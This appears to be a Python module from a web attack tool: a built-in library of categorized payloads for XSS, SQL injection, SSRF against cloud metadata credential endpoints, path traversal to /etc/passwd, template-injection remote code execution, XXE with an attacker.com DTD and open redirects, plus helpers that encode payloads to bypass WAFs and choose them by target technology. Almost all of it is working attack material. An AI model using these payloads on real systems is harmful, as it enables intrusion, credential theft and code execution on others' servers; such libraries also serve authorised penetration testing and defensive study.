"""
Payload Generator — Categorized payloads with bypass variants
100% free — built-in payload library.
"""

from typing import Optional
import base64
import urllib.parse

# ── Payload Libraries ─────────────────────────────────────────────────────────

PAYLOADS = {
    "xss": {
        "basic": [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            '<iframe src="javascript:alert(1)">',
            '<body onload=alert(1)>',
            '<input autofocus onfocus=alert(1)>',
        ],
        "waf_bypass": [
            '<ScRiPt>alert(1)</ScRiPt>',
            '<script>alert`1`</script>',
            '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">',
            '<svg/onload=alert(1)>',
            '<<script>alert(1)//</script>',
            '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
            '<img src="x`\"` onerror=`alert(1)`">',
            '"><script>setTimeout(alert,0,1)</script>',
        ],
        "dom": [
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "#<script>alert(1)</script>",
        ],
        "polyglot": [
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
        ]
    },
    "sqli": {
        "basic": [
            "' OR '1'='1",
            "' OR 1=1--",
            '" OR "1"="1"',
            "' OR 'x'='x",
            "admin'--",
            "' OR 1=1#",
            "') OR ('1'='1",
            "1' ORDER BY 1--",
            "1' UNION SELECT NULL--",
            "1' UNION SELECT NULL,NULL--",
        ],
        "union_based": [
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT username,password,NULL FROM users--",
            "' UNION SELECT table_name,NULL FROM information_schema.tables--",
            "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
        ],
        "time_based": [
            "' AND SLEEP(3)--",
            "'; WAITFOR DELAY '0:0:3'--",
            "'; SELECT pg_sleep(3)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
            "1; exec xp_cmdshell('ping 127.0.0.1')--",
        ],
        "error_based": [
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
            "' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7e,(SELECT database()),0x7e,1))s), 8446744073709551610, 8446744073709551610)))--",
        ],
        "waf_bypass": [
            "'/**/OR/**/'1'='1",
            "' /*!OR*/ '1'='1",
            "' OR%001=1--",
            "' oR '1'='1",
            "\" OR \"1\" LIKE \"1",
        ]
    },
    "ssrf": {
        "basic": [
            "http://127.0.0.1/",
            "http://localhost/",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://100.100.100.200/latest/meta-data/",
            "http://192.168.0.1/",
            "file:///etc/passwd",
            "file:///C:/Windows/win.ini",
        ],
        "bypass": [
            "http://0177.0.0.1/",       # Octal
            "http://2130706433/",        # Decimal IP
            "http://0x7f000001/",        # Hex IP
            "http://[::1]/",             # IPv6
            "http://127.0.0.1.nip.io/", # DNS rebinding
            "http://localtest.me/",
            "http://spoofed.burpcollaborator.net/",
        ],
        "cloud_metadata": [
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/user-data/",
            "http://metadata.google.internal/computeMetadata/v1/project/",
            "http://169.254.169.254/metadata/v1/",
        ]
    },
    "lfi": {
        "linux": [
            "../../../etc/passwd",
            "../../../../../../etc/passwd%00",
            "....//....//....//etc/passwd",
            "%2e%2e%2fetc%2fpasswd",
            "..%252fetc%252fpasswd",
            "php://filter/convert.base64-encode/resource=/etc/passwd",
            "php://input",
            "expect://id",
            "/proc/self/environ",
            "/var/log/apache2/access.log",
        ],
        "windows": [
            "..\\..\\..\\windows\\win.ini",
            "../../../../../../windows/win.ini",
            "C:\\windows\\win.ini",
            "..\\..\\..\\boot.ini",
        ]
    },
    "ssti": {
        "detection": [
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "<%= 7*7 %>",
            "{{7*'7'}}",
            "${{'a':'b'}}",
            "{{config}}",
        ],
        "jinja2_rce": [
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "{{''.join([].__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').readlines())}}",
        ],
        "twig_rce": [
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            "{{['id']|filter('system')}}",
        ]
    },
    "xxe": {
        "basic": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
        ],
        "blind": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]><foo>bar</foo>',
        ]
    },
    "jwt": {
        "alg_none": "Change the 'alg' header to 'none' and remove the signature",
        "weak_secrets": ["secret", "password", "123456", "test", "jwt_secret", "your-256-bit-secret"],
        "rs256_to_hs256": "Convert RS256 to HS256 using the public key as HMAC secret",
    },
    "open_redirect": [
        "https://evil.com",
        "//evil.com",
        "/\\evil.com",
        "https:evil.com",
        "/%09/evil.com",
        "///evil.com",
        "https://evil%E3%80%82com",
    ],
}


def get_payloads(category: str, subcategory: str = "basic") -> list:
    """Get payloads for a specific vulnerability category."""
    cat = PAYLOADS.get(category.lower(), {})
    if isinstance(cat, list):
        return cat
    if isinstance(cat, dict):
        return cat.get(subcategory, cat.get("basic", []))
    return []


def get_all_categories() -> list[str]:
    return list(PAYLOADS.keys())


def encode_payload(payload: str, encoding: str) -> str:
    """Apply encoding to a payload for WAF bypass."""
    encodings = {
        "url":       urllib.parse.quote(payload),
        "url_full":  urllib.parse.quote(payload, safe=""),
        "double_url": urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe=""),
        "base64":    base64.b64encode(payload.encode()).decode(),
        "hex":       payload.encode().hex(),
        "html_ent":  "".join(f"&#{ord(c)};" for c in payload),
        "unicode":   "".join(f"\\u{ord(c):04x}" if ord(c) > 127 else c for c in payload),
        "none":      payload,
    }
    return encodings.get(encoding, payload)


def get_bypass_variants(payload: str) -> dict:
    """Generate all bypass-encoded variants of a payload."""
    return {enc: encode_payload(payload, enc)
            for enc in ["none", "url", "url_full", "double_url", "base64", "html_ent"]}


def context_suggest(tech_stack: list[str]) -> list[str]:
    """Suggest most relevant payload types based on detected technology."""
    suggestions = []
    tech_lower = [t.lower() for t in tech_stack]

    if "php" in tech_lower:
        suggestions += ["sqli", "lfi", "xxe", "ssti"]
    if "mysql" in tech_lower or "postgres" in tech_lower:
        suggestions += ["sqli"]
    if "angular" in tech_lower or "react" in tech_lower or "vue" in tech_lower:
        suggestions += ["xss", "open_redirect"]
    if "wordpress" in tech_lower:
        suggestions += ["sqli", "xss", "lfi"]
    if "django" in tech_lower or "flask" in tech_lower or "jinja" in tech_lower:
        suggestions += ["ssti"]
    if "node" in tech_lower or "express" in tech_lower:
        suggestions += ["xss", "ssrf", "open_redirect"]
    if "aws" in tech_lower or "cloudflare" in tech_lower:
        suggestions += ["ssrf"]

    return list(set(suggestions)) or ["xss", "sqli", "ssrf"]
